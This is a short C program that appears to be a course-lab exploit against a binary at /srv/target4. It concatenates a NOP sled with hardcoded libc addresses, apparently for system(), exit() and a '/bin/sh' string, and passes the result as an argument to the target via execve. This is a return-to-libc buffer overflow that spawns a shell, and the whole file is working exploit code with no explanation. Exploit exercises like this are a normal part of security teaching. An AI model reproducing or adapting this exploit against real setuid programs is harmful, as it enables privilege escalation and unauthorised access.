#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

const char* TARGET = "/srv/target4";

const char* SLED = "\x90\x90\x90\x90\x90\x90\x90\x90";
const char* SYS = "\x60\x43\xe1\xf7";
const char* EX = "\xc0\x6e\xe0\xf7";
const char* SH = "\x63\xf3\xf5\xf7";

int main(void)
{
    char *args[3];
    char *env[1];
    args[0] = (char*)TARGET;

    args[1] = malloc(strlen(SLED) + strlen(SYS) + strlen(EX) + strlen(SH) + 1);
   
    strcpy(args[1], SLED);
    strcat(args[1], SYS);
    strcat(args[1], EX);
    strcat(args[1], SH);

    args[2] = NULL;
    env[0] = NULL;

    execve(TARGET, args, env);
    fprintf(stderr, "execve failed.\n");

    return 0;
}
